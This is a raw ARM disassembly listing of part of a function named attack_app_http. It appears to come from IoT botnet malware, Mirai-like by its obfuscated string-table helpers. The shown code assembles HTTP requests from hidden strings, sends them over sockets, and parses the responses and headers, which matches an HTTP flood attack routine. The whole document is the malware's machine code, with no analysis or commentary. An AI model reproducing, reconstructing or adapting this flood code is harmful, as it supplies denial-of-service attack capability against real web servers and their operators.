    892c:	e59d101c 	ldr	r1, [sp, #28]
    8930:	e0810000 	add	r0, r1, r0
    8934:	e2851f85 	add	r1, r5, #532	; 0x214
    8938:	eb003084 	bl	14b50 <util_strcpy>
    893c:	e59d001c 	ldr	r0, [sp, #28]
    8940:	eb003078 	bl	14b28 <util_strlen>
    8944:	e59d201c 	ldr	r2, [sp, #28]
    8948:	e59f16a4 	ldr	r1, [pc, #1700]	; 8ff4 <attack_app_http+0xe24>
    894c:	e0820000 	add	r0, r2, r0
    8950:	eb00307e 	bl	14b50 <util_strcpy>
    8954:	e59d001c 	ldr	r0, [sp, #28]
    8958:	eb003072 	bl	14b28 <util_strlen>
    895c:	e59d301c 	ldr	r3, [sp, #28]
    8960:	e2851014 	add	r1, r5, #20
    8964:	e0830000 	add	r0, r3, r0
    8968:	eb003078 	bl	14b50 <util_strcpy>
    896c:	e59d001c 	ldr	r0, [sp, #28]
    8970:	eb00306c 	bl	14b28 <util_strlen>
    8974:	e59dc01c 	ldr	ip, [sp, #28]
    8978:	e59f1678 	ldr	r1, [pc, #1656]	; 8ff8 <attack_app_http+0xe28>
    897c:	e08c0000 	add	r0, ip, r0
    8980:	eb003072 	bl	14b50 <util_strcpy>
    8984:	e59d001c 	ldr	r0, [sp, #28]
    8988:	eb003066 	bl	14b28 <util_strlen>
    898c:	e59de01c 	ldr	lr, [sp, #28]
    8990:	e2851fc5 	add	r1, r5, #788	; 0x314
    8994:	e08e0000 	add	r0, lr, r0
    8998:	e2811001 	add	r1, r1, #1
    899c:	eb00306b 	bl	14b50 <util_strcpy>
    89a0:	e59d001c 	ldr	r0, [sp, #28]
    89a4:	eb00305f 	bl	14b28 <util_strlen>
    89a8:	e59d101c 	ldr	r1, [sp, #28]
    89ac:	e0810000 	add	r0, r1, r0
    89b0:	e59f1650 	ldr	r1, [pc, #1616]	; 9008 <attack_app_http+0xe38>
    89b4:	eb003065 	bl	14b50 <util_strcpy>
    89b8:	e3a00039 	mov	r0, #57	; 0x39
    89bc:	eb002ad7 	bl	13520 <table_unlock_val>
    89c0:	e59d001c 	ldr	r0, [sp, #28]
    89c4:	eb003057 	bl	14b28 <util_strlen>
    89c8:	e1a01009 	mov	r1, r9
    89cc:	e1a04000 	mov	r4, r0
    89d0:	e3a00039 	mov	r0, #57	; 0x39
    89d4:	eb002aa0 	bl	1345c <table_retrieve_val>
    89d8:	e59d201c 	ldr	r2, [sp, #28]
    89dc:	e1a01000 	mov	r1, r0
    89e0:	e0820004 	add	r0, r2, r4
    89e4:	eb003059 	bl	14b50 <util_strcpy>
    89e8:	e3a00039 	mov	r0, #57	; 0x39
    89ec:	eb002aa3 	bl	13480 <table_lock_val>
    89f0:	e59d001c 	ldr	r0, [sp, #28]
    89f4:	eb00304b 	bl	14b28 <util_strlen>
    89f8:	e59d301c 	ldr	r3, [sp, #28]
    89fc:	e59f1604 	ldr	r1, [pc, #1540]	; 9008 <attack_app_http+0xe38>
    8a00:	e0830000 	add	r0, r3, r0
    8a04:	eb003051 	bl	14b50 <util_strcpy>
    8a08:	e3a0003a 	mov	r0, #58	; 0x3a
    8a0c:	eb002ac3 	bl	13520 <table_unlock_val>
    8a10:	e59d001c 	ldr	r0, [sp, #28]
    8a14:	eb003043 	bl	14b28 <util_strlen>
    8a18:	e1a01009 	mov	r1, r9
    8a1c:	e1a04000 	mov	r4, r0
    8a20:	e3a0003a 	mov	r0, #58	; 0x3a
    8a24:	eb002a8c 	bl	1345c <table_retrieve_val>
    8a28:	e59dc01c 	ldr	ip, [sp, #28]
    8a2c:	e1a01000 	mov	r1, r0
    8a30:	e08c0004 	add	r0, ip, r4
    8a34:	eb003045 	bl	14b50 <util_strcpy>
    8a38:	e3a0003a 	mov	r0, #58	; 0x3a
    8a3c:	eb002a8f 	bl	13480 <table_lock_val>
    8a40:	e59d001c 	ldr	r0, [sp, #28]
    8a44:	eb003037 	bl	14b28 <util_strlen>
    8a48:	e59de01c 	ldr	lr, [sp, #28]
    8a4c:	e59f15b4 	ldr	r1, [pc, #1460]	; 9008 <attack_app_http+0xe38>
    8a50:	e08e0000 	add	r0, lr, r0
    8a54:	eb00303d 	bl	14b50 <util_strcpy>
    8a58:	e3a0003b 	mov	r0, #59	; 0x3b
    8a5c:	eb002aaf 	bl	13520 <table_unlock_val>
    8a60:	e59d001c 	ldr	r0, [sp, #28]
    8a64:	eb00302f 	bl	14b28 <util_strlen>
    8a68:	e1a01009 	mov	r1, r9
    8a6c:	e1a04000 	mov	r4, r0
    8a70:	e3a0003b 	mov	r0, #59	; 0x3b
    8a74:	eb002a78 	bl	1345c <table_retrieve_val>
    8a78:	e59d201c 	ldr	r2, [sp, #28]
    8a7c:	e1a01000 	mov	r1, r0
    8a80:	e0820004 	add	r0, r2, r4
    8a84:	eb003031 	bl	14b50 <util_strcpy>
    8a88:	e3a0003b 	mov	r0, #59	; 0x3b
    8a8c:	eb002a7b 	bl	13480 <table_lock_val>
    8a90:	e59d001c 	ldr	r0, [sp, #28]
    8a94:	eb003023 	bl	14b28 <util_strlen>
    8a98:	e59d301c 	ldr	r3, [sp, #28]
    8a9c:	e59f1564 	ldr	r1, [pc, #1380]	; 9008 <attack_app_http+0xe38>
    8aa0:	e0830000 	add	r0, r3, r0
    8aa4:	eb003029 	bl	14b50 <util_strcpy>
    8aa8:	e59dc03c 	ldr	ip, [sp, #60]	; 0x3c
    8aac:	e15c0009 	cmp	ip, r9
    8ab0:	0a000033 	beq	8b84 <attack_app_http+0x9b4>
    8ab4:	e3a0003c 	mov	r0, #60	; 0x3c
    8ab8:	eb002a98 	bl	13520 <table_unlock_val>
    8abc:	e59d001c 	ldr	r0, [sp, #28]
    8ac0:	eb003018 	bl	14b28 <util_strlen>
    8ac4:	e1a01009 	mov	r1, r9
    8ac8:	e1a04000 	mov	r4, r0
    8acc:	e3a0003c 	mov	r0, #60	; 0x3c
    8ad0:	eb002a61 	bl	1345c <table_retrieve_val>
    8ad4:	e59de01c 	ldr	lr, [sp, #28]
    8ad8:	e1a01000 	mov	r1, r0
    8adc:	e08e0004 	add	r0, lr, r4
    8ae0:	eb00301a 	bl	14b50 <util_strcpy>
    8ae4:	e3a0003c 	mov	r0, #60	; 0x3c
    8ae8:	eb002a64 	bl	13480 <table_lock_val>
    8aec:	e59d001c 	ldr	r0, [sp, #28]
    8af0:	eb00300c 	bl	14b28 <util_strlen>
    8af4:	e59d101c 	ldr	r1, [sp, #28]
    8af8:	e0810000 	add	r0, r1, r0
    8afc:	e59f1504 	ldr	r1, [pc, #1284]	; 9008 <attack_app_http+0xe38>
    8b00:	eb003012 	bl	14b50 <util_strcpy>
    8b04:	e59d001c 	ldr	r0, [sp, #28]
    8b08:	eb003006 	bl	14b28 <util_strlen>
    8b0c:	e1a01009 	mov	r1, r9
    8b10:	e1a04000 	mov	r4, r0
    8b14:	e3a00041 	mov	r0, #65	; 0x41
    8b18:	eb002a4f 	bl	1345c <table_retrieve_val>
    8b1c:	e59d201c 	ldr	r2, [sp, #28]
    8b20:	e1a01000 	mov	r1, r0
    8b24:	e0820004 	add	r0, r2, r4
    8b28:	eb003008 	bl	14b50 <util_strcpy>
    8b2c:	e59d001c 	ldr	r0, [sp, #28]
    8b30:	eb002ffc 	bl	14b28 <util_strlen>
    8b34:	e59d301c 	ldr	r3, [sp, #28]
    8b38:	e59f14b0 	ldr	r1, [pc, #1200]	; 8ff0 <attack_app_http+0xe20>
    8b3c:	e0830000 	add	r0, r3, r0
    8b40:	eb003002 	bl	14b50 <util_strcpy>
    8b44:	e59d003c 	ldr	r0, [sp, #60]	; 0x3c
    8b48:	eb002ff6 	bl	14b28 <util_strlen>
    8b4c:	e1a04000 	mov	r4, r0
    8b50:	e59d001c 	ldr	r0, [sp, #28]
    8b54:	eb002ff3 	bl	14b28 <util_strlen>
    8b58:	e59dc01c 	ldr	ip, [sp, #28]
    8b5c:	e3a0100a 	mov	r1, #10
    8b60:	e08c2000 	add	r2, ip, r0
    8b64:	e1a00004 	mov	r0, r4
    8b68:	eb00312a 	bl	15018 <util_itoa>
    8b6c:	e59d001c 	ldr	r0, [sp, #28]
    8b70:	eb002fec 	bl	14b28 <util_strlen>
    8b74:	e59de01c 	ldr	lr, [sp, #28]
    8b78:	e59f1488 	ldr	r1, [pc, #1160]	; 9008 <attack_app_http+0xe38>
    8b7c:	e08e0000 	add	r0, lr, r0
    8b80:	eb002ff2 	bl	14b50 <util_strcpy>
    8b84:	e5963010 	ldr	r3, [r6, #16]
    8b88:	e3530000 	cmp	r3, #0
    8b8c:	da000027 	ble	8c30 <attack_app_http+0xa60>
    8b90:	e59d001c 	ldr	r0, [sp, #28]
    8b94:	eb002fe3 	bl	14b28 <util_strlen>
    8b98:	e59d101c 	ldr	r1, [sp, #28]
    8b9c:	e0810000 	add	r0, r1, r0
    8ba0:	e59f1454 	ldr	r1, [pc, #1108]	; 8ffc <attack_app_http+0xe2c>
    8ba4:	eb002fe9 	bl	14b50 <util_strcpy>
    8ba8:	e5963010 	ldr	r3, [r6, #16]
    8bac:	e28d2a05 	add	r2, sp, #20480	; 0x5000
    8bb0:	e3530000 	cmp	r3, #0
    8bb4:	e582916c 	str	r9, [r2, #364]	; 0x16c
    8bb8:	da000016 	ble	8c18 <attack_app_http+0xa48>
    8bbc:	e59d001c 	ldr	r0, [sp, #28]
    8bc0:	eb002fd8 	bl	14b28 <util_strlen>
    8bc4:	e28d3a05 	add	r3, sp, #20480	; 0x5000
    8bc8:	e593116c 	ldr	r1, [r3, #364]	; 0x16c
    8bcc:	e59dc01c 	ldr	ip, [sp, #28]
    8bd0:	e1a01381 	lsl	r1, r1, #7
    8bd4:	e2811d17 	add	r1, r1, #1472	; 0x5c0
    8bd8:	e08c0000 	add	r0, ip, r0
    8bdc:	e0851001 	add	r1, r5, r1
    8be0:	eb002fda 	bl	14b50 <util_strcpy>
    8be4:	e59d001c 	ldr	r0, [sp, #28]
    8be8:	eb002fce 	bl	14b28 <util_strlen>
    8bec:	e59de01c 	ldr	lr, [sp, #28]
    8bf0:	e59f1408 	ldr	r1, [pc, #1032]	; 9000 <attack_app_http+0xe30>
    8bf4:	e08e0000 	add	r0, lr, r0
    8bf8:	eb002fd4 	bl	14b50 <util_strcpy>
    8bfc:	e28d1a05 	add	r1, sp, #20480	; 0x5000
    8c00:	e591316c 	ldr	r3, [r1, #364]	; 0x16c
    8c04:	e5962010 	ldr	r2, [r6, #16]
    8c08:	e283c001 	add	ip, r3, #1
    8c0c:	e152000c 	cmp	r2, ip
    8c10:	e581c16c 	str	ip, [r1, #364]	; 0x16c
    8c14:	caffffe8 	bgt	8bbc <attack_app_http+0x9ec>
    8c18:	e59d001c 	ldr	r0, [sp, #28]
    8c1c:	eb002fc1 	bl	14b28 <util_strlen>
    8c20:	e59d201c 	ldr	r2, [sp, #28]
    8c24:	e59f13dc 	ldr	r1, [pc, #988]	; 9008 <attack_app_http+0xe38>
    8c28:	e0820000 	add	r0, r2, r0
    8c2c:	eb002fc7 	bl	14b50 <util_strcpy>
    8c30:	e59d001c 	ldr	r0, [sp, #28]
    8c34:	eb002fbb 	bl	14b28 <util_strlen>
    8c38:	e59d301c 	ldr	r3, [sp, #28]
    8c3c:	e59f13c4 	ldr	r1, [pc, #964]	; 9008 <attack_app_http+0xe38>
    8c40:	e0830000 	add	r0, r3, r0
    8c44:	eb002fc1 	bl	14b50 <util_strcpy>
    8c48:	e59dc03c 	ldr	ip, [sp, #60]	; 0x3c
    8c4c:	e35c0000 	cmp	ip, #0
    8c50:	0a000005 	beq	8c6c <attack_app_http+0xa9c>
    8c54:	e59d001c 	ldr	r0, [sp, #28]
    8c58:	eb002fb2 	bl	14b28 <util_strlen>
    8c5c:	e59de01c 	ldr	lr, [sp, #28]
    8c60:	e59d103c 	ldr	r1, [sp, #60]	; 0x3c
    8c64:	e08e0000 	add	r0, lr, r0
    8c68:	eb002fb8 	bl	14b50 <util_strcpy>
    8c6c:	e2854e5a 	add	r4, r5, #1440	; 0x5a0
    8c70:	e1a0000b 	mov	r0, fp
    8c74:	e1a01004 	mov	r1, r4
    8c78:	eb0030a1 	bl	14f04 <util_strcmp>
    8c7c:	e3500000 	cmp	r0, #0
    8c80:	0a00028d 	beq	96bc <attack_app_http+0x14ec>
    8c84:	e59d001c 	ldr	r0, [sp, #28]
    8c88:	e51645ac 	ldr	r4, [r6, #-1452]	; 0xfffffa54
    8c8c:	eb002fa5 	bl	14b28 <util_strlen>
    8c90:	e59d101c 	ldr	r1, [sp, #28]
    8c94:	e1a02000 	mov	r2, r0
    8c98:	e3a03901 	mov	r3, #16384	; 0x4000
    8c9c:	e1a00004 	mov	r0, r4
    8ca0:	eb003888 	bl	16ec8 <__libc_send>
    8ca4:	e516c5ac 	ldr	ip, [r6, #-1452]	; 0xfffffa54
    8ca8:	e28d1c51 	add	r1, sp, #20736	; 0x5100
    8cac:	e1a022ac 	lsr	r2, ip, #5
    8cb0:	e2811070 	add	r1, r1, #112	; 0x70
    8cb4:	e1a02102 	lsl	r2, r2, #2
    8cb8:	e0822001 	add	r2, r2, r1
    8cbc:	e51210a4 	ldr	r1, [r2, #-164]	; 0xffffff5c
    8cc0:	e3a03001 	mov	r3, #1
    8cc4:	e20c001f 	and	r0, ip, #31
    8cc8:	e1811013 	orr	r1, r1, r3, lsl r0
    8ccc:	e2833005 	add	r3, r3, #5
    8cd0:	e50210a4 	str	r1, [r2, #-164]	; 0xffffff5c
    8cd4:	e54635a8 	strb	r3, [r6, #-1448]	; 0xfffffa58
    8cd8:	e15c0008 	cmp	ip, r8
    8cdc:	e59d2034 	ldr	r2, [sp, #52]	; 0x34
    8ce0:	c28c8001 	addgt	r8, ip, #1
    8ce4:	e50625a0 	str	r2, [r6, #-1440]	; 0xfffffa60
    8ce8:	eafffe41 	b	85f4 <attack_app_http+0x424>
    8cec:	e51635a4 	ldr	r3, [r6, #-1444]	; 0xfffffa5c
    8cf0:	e59d1034 	ldr	r1, [sp, #52]	; 0x34
    8cf4:	e0633001 	rsb	r3, r3, r1
    8cf8:	e353001e 	cmp	r3, #30
    8cfc:	8afffe36 	bhi	85dc <attack_app_http+0x40c>
    8d00:	e516c5ac 	ldr	ip, [r6, #-1452]	; 0xfffffa54
    8d04:	e28d3c51 	add	r3, sp, #20736	; 0x5100
    8d08:	e1a022ac 	lsr	r2, ip, #5
    8d0c:	e1a02102 	lsl	r2, r2, #2
    8d10:	e2833070 	add	r3, r3, #112	; 0x70
    8d14:	e0822003 	add	r2, r2, r3
    8d18:	eafffe7e 	b	8718 <attack_app_http+0x548>
    8d1c:	e516c5ac 	ldr	ip, [r6, #-1452]	; 0xfffffa54
    8d20:	e28d3c51 	add	r3, sp, #20736	; 0x5100
    8d24:	e1a022ac 	lsr	r2, ip, #5
    8d28:	e2833070 	add	r3, r3, #112	; 0x70
    8d2c:	e1a02102 	lsl	r2, r2, #2
    8d30:	e0822003 	add	r2, r2, r3
    8d34:	e51210a4 	ldr	r1, [r2, #-164]	; 0xffffff5c
    8d38:	e20c001f 	and	r0, ip, #31
    8d3c:	e3a03001 	mov	r3, #1
    8d40:	e1811013 	orr	r1, r1, r3, lsl r0
    8d44:	e15c0008 	cmp	ip, r8
    8d48:	e50210a4 	str	r1, [r2, #-164]	; 0xffffff5c
    8d4c:	dafffe28 	ble	85f4 <attack_app_http+0x424>
    8d50:	e08c8003 	add	r8, ip, r3
    8d54:	eafffe77 	b	8738 <attack_app_http+0x568>
    8d58:	eb0036be 	bl	16858 <__GI___errno_location>
    8d5c:	e59a3294 	ldr	r3, [sl, #660]	; 0x294
    8d60:	e2897d21 	add	r7, r9, #2112	; 0x840
    8d64:	e3530b01 	cmp	r3, #1024	; 0x400
    8d68:	e1a0b000 	mov	fp, r0
    8d6c:	e2877004 	add	r7, r7, #4
    8d70:	0a00003e 	beq	8e70 <attack_app_http+0xca0>
    8d74:	e3a03000 	mov	r3, #0
    8d78:	e58b3000 	str	r3, [fp]
    8d7c:	e59a1294 	ldr	r1, [sl, #660]	; 0x294
    8d80:	e51a05ac 	ldr	r0, [sl, #-1452]	; 0xfffffa54
    8d84:	e2612b01 	rsb	r2, r1, #1024	; 0x400
    8d88:	e2833901 	add	r3, r3, #16384	; 0x4000
    8d8c:	e0871001 	add	r1, r7, r1
    8d90:	eb0037eb 	bl	16d44 <__libc_recv>
    8d94:	e3500000 	cmp	r0, #0
    8d98:	0a00024b 	beq	96cc <attack_app_http+0x14fc>
    8d9c:	e3700001 	cmn	r0, #1
    8da0:	0a000252 	beq	96f0 <attack_app_http+0x1520>
    8da4:	e59a4294 	ldr	r4, [sl, #660]	; 0x294
    8da8:	e59d1038 	ldr	r1, [sp, #56]	; 0x38
    8dac:	e0844000 	add	r4, r4, r0
    8db0:	e58a4294 	str	r4, [sl, #660]	; 0x294
    8db4:	e50a15a4 	str	r1, [sl, #-1444]	; 0xfffffa5c
    8db8:	ea000021 	b	8e44 <attack_app_http+0xc74>
    8dbc:	e59a8000 	ldr	r8, [sl]
    8dc0:	e1550004 	cmp	r5, r4
    8dc4:	b1a06005 	movlt	r6, r5
    8dc8:	a1a06004 	movge	r6, r4
    8dcc:	e0663005 	rsb	r3, r6, r5
    8dd0:	e3580001 	cmp	r8, #1
    8dd4:	e58a300c 	str	r3, [sl, #12]
    8dd8:	11a05003 	movne	r5, r3
    8ddc:	0a00002c 	beq	8e94 <attack_app_http+0xcc4>
    8de0:	e3550000 	cmp	r5, #0
    8de4:	1a000007 	bne	8e08 <attack_app_http+0xc38>
    8de8:	e59a4008 	ldr	r4, [sl, #8]
    8dec:	e3540001 	cmp	r4, #1
    8df0:	0a000033 	beq	8ec4 <attack_app_http+0xcf4>
    8df4:	e59a3294 	ldr	r3, [sl, #660]	; 0x294
    8df8:	e0663003 	rsb	r3, r6, r3
    8dfc:	e3530000 	cmp	r3, #0
    8e00:	e58a300c 	str	r3, [sl, #12]
    8e04:	0a000229 	beq	96b0 <attack_app_http+0x14e0>
    8e08:	e3560000 	cmp	r6, #0
    8e0c:	0a000011 	beq	8e58 <attack_app_http+0xc88>
    8e10:	e59a3294 	ldr	r3, [sl, #660]	; 0x294
    8e14:	e0664003 	rsb	r4, r6, r3
    8e18:	e1a02004 	mov	r2, r4
    8e1c:	e58a4294 	str	r4, [sl, #660]	; 0x294
    8e20:	e0871006 	add	r1, r7, r6
    8e24:	e1a00007 	mov	r0, r7
    8e28:	eb0036a4 	bl	168c0 <__GI_memmove>
    8e2c:	e59a4294 	ldr	r4, [sl, #660]	; 0x294
    8e30:	e3a03000 	mov	r3, #0
    8e34:	e0892004 	add	r2, r9, r4
    8e38:	e3540000 	cmp	r4, #0
    8e3c:	e5c23844 	strb	r3, [r2, #2116]	; 0x844
    8e40:	0a000004 	beq	8e58 <attack_app_http+0xc88>
    8e44:	e59a500c 	ldr	r5, [sl, #12]
    8e48:	e3550000 	cmp	r5, #0
    8e4c:	caffffda 	bgt	8dbc <attack_app_http+0xbec>
    8e50:	e3a06000 	mov	r6, #0
    8e54:	eaffffe1 	b	8de0 <attack_app_http+0xc10>
    8e58:	e55a35a8 	ldrb	r3, [sl, #-1448]	; 0xfffffa58
    8e5c:	e3530007 	cmp	r3, #7
    8e60:	1afffe61 	bne	87ec <attack_app_http+0x61c>
    8e64:	e59a3294 	ldr	r3, [sl, #660]	; 0x294
    8e68:	e3530b01 	cmp	r3, #1024	; 0x400
    8e6c:	1affffc0 	bne	8d74 <attack_app_http+0xba4>
    8e70:	e2891d22 	add	r1, r9, #2176	; 0x880
    8e74:	e2811004 	add	r1, r1, #4
    8e78:	e1a00007 	mov	r0, r7
    8e7c:	e3a02d0f 	mov	r2, #960	; 0x3c0
    8e80:	eb00368e 	bl	168c0 <__GI_memmove>
    8e84:	e59a3294 	ldr	r3, [sl, #660]	; 0x294
    8e88:	e2434040 	sub	r4, r3, #64	; 0x40
    8e8c:	e58a4294 	str	r4, [sl, #660]	; 0x294
    8e90:	eaffffb7 	b	8d74 <attack_app_http+0xba4>
    8e94:	e3a01000 	mov	r1, #0
    8e98:	e3a0003d 	mov	r0, #61	; 0x3d
    8e9c:	eb00296e 	bl	1345c <table_retrieve_val>
    8ea0:	e1a01004 	mov	r1, r4
    8ea4:	e1a02000 	mov	r2, r0
    8ea8:	e3a0300b 	mov	r3, #11
    8eac:	e1a00007 	mov	r0, r7
    8eb0:	eb002f4a 	bl	14be0 <util_memsearch>
    8eb4:	e3700001 	cmn	r0, #1
    8eb8:	1a0002b3 	bne	998c <attack_app_http+0x17bc>
    8ebc:	e59a500c 	ldr	r5, [sl, #12]
    8ec0:	eaffffc6 	b	8de0 <attack_app_http+0xc10>
    8ec4:	e1a00007 	mov	r0, r7
    8ec8:	e59a1294 	ldr	r1, [sl, #660]	; 0x294
    8ecc:	e59f2134 	ldr	r2, [pc, #308]	; 9008 <attack_app_http+0xe38>
    8ed0:	e3a03002 	mov	r3, #2
    8ed4:	eb002f41 	bl	14be0 <util_memsearch>
    8ed8:	e3700001 	cmn	r0, #1
    8edc:	0affffc9 	beq	8e08 <attack_app_http+0xc38>
    8ee0:	e59a1294 	ldr	r1, [sl, #660]	; 0x294
    8ee4:	e59f211c 	ldr	r2, [pc, #284]	; 9008 <attack_app_http+0xe38>
    8ee8:	e3a03002 	mov	r3, #2
    8eec:	e1a00007 	mov	r0, r7
    8ef0:	eb002f3a 	bl	14be0 <util_memsearch>
    8ef4:	e089c000 	add	ip, r9, r0
    8ef8:	e1a06000 	mov	r6, r0
    8efc:	e1a01006 	mov	r1, r6
    8f00:	e1a00007 	mov	r0, r7
    8f04:	e59f20f8 	ldr	r2, [pc, #248]	; 9004 <attack_app_http+0xe34>
    8f08:	e1a03004 	mov	r3, r4
    8f0c:	e5cc5842 	strb	r5, [ip, #2114]	; 0x842
    8f10:	eb002f32 	bl	14be0 <util_memsearch>
    8f14:	e3700001 	cmn	r0, #1
    8f18:	0a000006 	beq	8f38 <attack_app_http+0xd68>
    8f1c:	e1a00007 	mov	r0, r7
    8f20:	e1a01006 	mov	r1, r6
    8f24:	e59f20d8 	ldr	r2, [pc, #216]	; 9004 <attack_app_http+0xe34>
    8f28:	e1a03004 	mov	r3, r4
    8f2c:	eb002f2b 	bl	14be0 <util_memsearch>
    8f30:	e0890000 	add	r0, r9, r0
    8f34:	e5c05844 	strb	r5, [r0, #2116]	; 0x844
    8f38:	e1a00007 	mov	r0, r7
    8f3c:	e3a01010 	mov	r1, #16
    8f40:	eb002f41 	bl	14c4c <util_atoi>
    8f44:	e3500000 	cmp	r0, #0
    8f48:	0a0002fc 	beq	9b40 <attack_app_http+0x1970>
    8f4c:	e2803002 	add	r3, r0, #2
    8f50:	e58a300c 	str	r3, [sl, #12]
    8f54:	eaffffab 	b	8e08 <attack_app_http+0xc38>
    8f58:	e516c5ac 	ldr	ip, [r6, #-1452]	; 0xfffffa54
    8f5c:	e28dec51 	add	lr, sp, #20736	; 0x5100
    8f60:	e1a022ac 	lsr	r2, ip, #5
    8f64:	e1a02102 	lsl	r2, r2, #2
    8f68:	e28ee070 	add	lr, lr, #112	; 0x70
    8f6c:	e082200e 	add	r2, r2, lr
    8f70:	e51210a4 	ldr	r1, [r2, #-164]	; 0xffffff5c
    8f74:	e20c001f 	and	r0, ip, #31
    8f78:	e2433006 	sub	r3, r3, #6
    8f7c:	e1811013 	orr	r1, r1, r3, lsl r0
    8f80:	e15c0008 	cmp	ip, r8
    8f84:	e50210a4 	str	r1, [r2, #-164]	; 0xffffff5c
    8f88:	dafffd99 	ble	85f4 <attack_app_http+0x424>
    8f8c:	e08c8003 	add	r8, ip, r3
    8f90:	eafffde8 	b	8738 <attack_app_http+0x568>
    8f94:	e51a05ac 	ldr	r0, [sl, #-1452]	; 0xfffffa54
    8f98:	eb0043a8 	bl	19e40 <__GI___libc_close>
    8f9c:	e3e03000 	mvn	r3, #0
    8fa0:	e50a35ac 	str	r3, [sl, #-1452]	; 0xfffffa54
    8fa4:	e54a55a8 	strb	r5, [sl, #-1448]	; 0xfffffa58
    8fa8:	eafffe0f 	b	87ec <attack_app_http+0x61c>
    8fac:	e516c5ac 	ldr	ip, [r6, #-1452]	; 0xfffffa54
    8fb0:	e28d1c51 	add	r1, sp, #20736	; 0x5100
    8fb4:	e1a022ac 	lsr	r2, ip, #5
    8fb8:	e2811070 	add	r1, r1, #112	; 0x70
    8fbc:	e1a02102 	lsl	r2, r2, #2
    8fc0:	e0822001 	add	r2, r2, r1
    8fc4:	e51210a4 	ldr	r1, [r2, #-164]	; 0xffffff5c
    8fc8:	e20c001f 	and	r0, ip, #31
    8fcc:	e2433009 	sub	r3, r3, #9
    8fd0:	e1811013 	orr	r1, r1, r3, lsl r0
    8fd4:	e15c0008 	cmp	ip, r8
    8fd8:	e50210a4 	str	r1, [r2, #-164]	; 0xffffff5c
    8fdc:	dafffd84 	ble	85f4 <attack_app_http+0x424>
    8fe0:	e08c8003 	add	r8, ip, r3
    8fe4:	eafffdd3 	b	8738 <attack_app_http+0x568>
    8fe8:	0001efa0 	.word	0x0001efa0
    8fec:	cccccccd 	.word	0xcccccccd
    8ff0:	0001ef94 	.word	0x0001ef94
    8ff4:	0001ef70 	.word	0x0001ef70
    8ff8:	0001ef88 	.word	0x0001ef88
    8ffc:	0001efa4 	.word	0x0001efa4
    9000:	0001efb0 	.word	0x0001efb0
    9004:	0001efbc 	.word	0x0001efbc
    9008:	0001f6fc 	.word	0x0001f6fc
    900c:	0001efc8 	.word	0x0001efc8
    9010:	0001efc0 	.word	0x0001efc0
    9014:	0001efb4 	.word	0x0001efb4
    9018:	0001efd0 	.word	0x0001efd0
    901c:	0001ef9c 	.word	0x0001ef9c
    9020:	0001efdc 	.word	0x0001efdc
    9024:	0001efd8 	.word	0x0001efd8
    9028:	e59d0014 	ldr	r0, [sp, #20]
    902c:	e3a01b0a 	mov	r1, #10240	; 0x2800
    9030:	eb002ee1 	bl	14bbc <util_zero>
    9034:	e3a03901 	mov	r3, #16384	; 0x4000
    9038:	e2833002 	add	r3, r3, #2
    903c:	e51a05ac 	ldr	r0, [sl, #-1452]	; 0xfffffa54
    9040:	e59d1014 	ldr	r1, [sp, #20]
    9044:	e3a02b0a 	mov	r2, #10240	; 0x2800
    9048:	eb00373d 	bl	16d44 <__libc_recv>
    904c:	e3e07c51 	mvn	r7, #20736	; 0x5100
    9050:	e250b000 	subs	fp, r0, #0
    9054:	e2477024 	sub	r7, r7, #36	; 0x24
    9058:	da00013c 	ble	9550 <attack_app_http+0x1380>
    905c:	e59d0014 	ldr	r0, [sp, #20]
    9060:	e1a0100b 	mov	r1, fp
    9064:	e51f2058 	ldr	r2, [pc, #-88]	; 9014 <attack_app_http+0xe44>
    9068:	e3a03004 	mov	r3, #4
    906c:	eb002edb 	bl	14be0 <util_memsearch>
    9070:	e3700001 	cmn	r0, #1
    9074:	1a000001 	bne	9080 <attack_app_http+0xeb0>
    9078:	e35b0b0a 	cmp	fp, #10240	; 0x2800
    907c:	bafffdda 	blt	87ec <attack_app_http+0x61c>
    9080:	e3a03004 	mov	r3, #4
    9084:	e51f2078 	ldr	r2, [pc, #-120]	; 9014 <attack_app_http+0xe44>
    9088:	e1a0100b 	mov	r1, fp
    908c:	e59d0014 	ldr	r0, [sp, #20]
    9090:	eb002ed2 	bl	14be0 <util_memsearch>
    9094:	e59dc014 	ldr	ip, [sp, #20]
    9098:	e3a05000 	mov	r5, #0
    909c:	e7cc5000 	strb	r5, [ip, r0]
    90a0:	e1a01005 	mov	r1, r5
    90a4:	e3a00047 	mov	r0, #71	; 0x47
    90a8:	eb0028eb 	bl	1345c <table_retrieve_val>
    90ac:	e1a0100b 	mov	r1, fp
    90b0:	e1a02000 	mov	r2, r0
    90b4:	e59d0014 	ldr	r0, [sp, #20]
    90b8:	eb002f6d 	bl	14e74 <util_stristr>
    90bc:	e3700001 	cmn	r0, #1
    90c0:	13a03002 	movne	r3, #2
    90c4:	158a3000 	strne	r3, [sl]
    90c8:	e1a01005 	mov	r1, r5
    90cc:	e3a00046 	mov	r0, #70	; 0x46
    90d0:	eb0028e1 	bl	1345c <table_retrieve_val>
    90d4:	e1a0100b 	mov	r1, fp
    90d8:	e1a02000 	mov	r2, r0
    90dc:	e59d0014 	ldr	r0, [sp, #20]
    90e0:	eb002f63 	bl	14e74 <util_stristr>
    90e4:	e3700001 	cmn	r0, #1
    90e8:	13a03001 	movne	r3, #1
    90ec:	158a3000 	strne	r3, [sl]
    90f0:	e1a01005 	mov	r1, r5
    90f4:	e3a00045 	mov	r0, #69	; 0x45
    90f8:	e58a5004 	str	r5, [sl, #4]
    90fc:	eb0028d6 	bl	1345c <table_retrieve_val>
    9100:	e1a0100b 	mov	r1, fp
    9104:	e1a02000 	mov	r2, r0
    9108:	e59d0014 	ldr	r0, [sp, #20]
    910c:	eb002f58 	bl	14e74 <util_stristr>
    9110:	e3700001 	cmn	r0, #1
    9114:	0a000028 	beq	91bc <attack_app_http+0xfec>
    9118:	e1a01005 	mov	r1, r5
    911c:	e3a00045 	mov	r0, #69	; 0x45
    9120:	eb0028cd 	bl	1345c <table_retrieve_val>
    9124:	e1a0100b 	mov	r1, fp
    9128:	e1a02000 	mov	r2, r0
    912c:	e59d0014 	ldr	r0, [sp, #20]
    9130:	eb002f4f 	bl	14e74 <util_stristr>
    9134:	e59de014 	ldr	lr, [sp, #20]
    9138:	e7de3000 	ldrb	r3, [lr, r0]
    913c:	e59d1014 	ldr	r1, [sp, #20]
    9140:	e3530020 	cmp	r3, #32
    9144:	e1a04000 	mov	r4, r0
    9148:	02804001 	addeq	r4, r0, #1
    914c:	e0816004 	add	r6, r1, r4
    9150:	e1a00006 	mov	r0, r6
    9154:	e064100b 	rsb	r1, r4, fp
